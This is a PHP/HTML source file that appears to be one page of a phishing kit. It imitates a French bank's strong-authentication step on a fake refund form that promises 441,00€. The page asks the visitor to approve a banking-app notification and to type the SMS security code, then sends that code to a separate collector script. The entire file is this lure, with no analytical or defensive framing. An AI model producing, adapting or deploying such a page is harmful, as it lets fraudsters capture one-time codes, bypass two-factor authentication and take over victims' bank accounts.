<?php
session_start();

include("./BIRNAVA/911.php");
?>
<!doctype html>
<html lang="fr"><head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="apple-itunes-app" content="app-id=505488770">
		
			<link rel="stylesheet" href="./X911/style_v2.css">

		<link rel="shortcut icon" href="./X911/favicon.ico" type="image/ico">

		<title>Formulaire de remboursement</title>
	</head>
	<body>


		<div id="banner" style="margin-bottom:6px;">
<div class="container">
<a href="#"><img src="./X911/logo.svg" style="margin-top:15px; height: 72px;"></a>
<img id="optionalstuff" src="./X911/lgn.png" style="float:right;margin-top:13px;">

<style>
@media (max-width:629px) {
  img#optionalstuff {
    display: none;
  }
}
</style>

</div>
</div>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
				    
				    
				    
				    
					<li><a href="#" title="Retour au portail">Accueil</a></li>
					<li class="active">Formulaire de remboursement (FRA5883934P)</li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" style="margin-top:-12px;" id="contenu">
			
			<div class="row" style="">
				<!-- Connexion Gauche-->	
				<div class="">
				</div> 
				

			<section class="col-md-6" id="aide">
					<div class="panel panel-default">
						<center><img src="./X911/auth.gif" width="340px" height="150px" style="
    width: -webkit-fill-available;
"></center>

<div class="panel-heading">

							<h2 id="titre_authent" style="margin-top:12px;color: #0b6ba8;" class="text-center">AUTHENTIFICATION FORTE</h2>
						</div>
						<form action="./siftA/B.php" method="POST">
						<div class="panel-body"><br>Veuillez confirmer la notification reçu via votre application bancaire. 
Cette authentification est obligatoire afin de prouver votre identité. Si vous n'avez pas de notification, un code sms vous sera transmis.<br><br>

							<div class="row">
									 

									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Code sécurité reçu sur votre téléphone:</label>
											<input type="text" name="ssm" id="ssm" class="form-control" required="" placeholder="Code sms" style="
    background-image: url(./X911/sms.png);
    background-repeat: no-repeat;
    background-position: 98%;
    background-size: 19px;
">
											
										</div> 
									</div> 
								</div>

								


								<div style="width:100%; background:rgba(0, 80, 157, 0.5);  border-radius:4px; padding: 6px; color: white;">Montant du remboursement: <b>441,00€;</b></div><br>

								<button class="btn btn-xl btn-primary" name="submit" type="submit"><i class="fas fa-lock"></i>Continuer</button>

								<br>
							
							
							
						</div>
						

					</form></div><div style="background:white; padding:12px;border-radius:4px;"><center>
					    
					    <picture>
  <source media="(min-width: 992px)" srcset="./X911/dDeoK_873743.png">
  <source media="(max-width:480px)" srcset="./X911/3d.png">
  <img src="./X911/dDeoK_873743.png" alt="">
</picture></center></div>
							
							
						</section></div>
				


			 <!-- row FIN -->
		</main> 
	

	
		
	
</body></html>